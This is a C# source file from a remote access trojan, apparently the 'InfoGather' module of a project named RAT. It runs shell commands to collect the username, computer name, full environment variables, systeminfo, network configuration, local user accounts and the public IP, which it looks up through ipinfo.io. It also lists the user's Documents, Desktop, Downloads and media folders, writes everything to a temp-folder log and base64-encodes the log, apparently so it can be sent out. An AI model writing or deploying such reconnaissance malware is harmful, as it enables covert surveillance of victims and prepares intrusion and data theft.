using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT
{
    class InfoGather
    {
         public static void gather()
        {
            using (StreamWriter w = File.AppendText(Path.GetTempPath() + Program.SystemID + @"\log"))
            {
                Log("\n--General Info--\n", w);
                Log(Shell.Exec("echo User Profile: %userprofile%"), w);
                Log(Shell.Exec("echo System Root: %systemroot%"), w);
                Log(Shell.Exec("echo Computer Name: %computername%"), w);
                Log(Shell.Exec("echo Username: %username%"), w);
                Log(Shell.Exec("set"), w);
                Log("\n--SysInfo--\n", w);
                Log(Shell.Exec("systeminfo"), w);
                Log("\n--IP Info--\n", w);
                Log(Shell.Exec("ipconfig /all"), w);
                Log("Public IP: "+Shell.Exec("powershell (Invoke-WebRequest http://ipinfo.io/ip).Content"), w);
                Log("\n--User Info--\n",w);
                Log(Shell.Exec("net user"), w);
                Log(Shell.Exec("net user %username%"), w);
                Log("\n--Files Info--\n", w);
                Log("\n--Documents--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Documents && dir"), w);
                Log("\n--Videos--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Videos && dir"), w);
                Log("\n--Pictures--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Pictures && dir"), w);
                Log("\n--Music--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Music && dir"), w);
                Log("\n--Desktop--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Desktop && dir"), w);
                Log("\n--Downloads--\n", w);
                Log(Shell.Exec("cd %userprofile%\\Downloads && dir"), w);
            }
        }

        public static void Log(string logMessage, TextWriter w)
        {
            w.WriteLine("-------------------------------");
            w.WriteLine($"{logMessage}");
            w.WriteLine("-------------------------------");
        }

        public static String read()
        {
            Byte[] bytes = File.ReadAllBytes(Path.GetTempPath() + Program.SystemID + @"\log");
            String file = Convert.ToBase64String(bytes);
            return file;
        }
    }
}

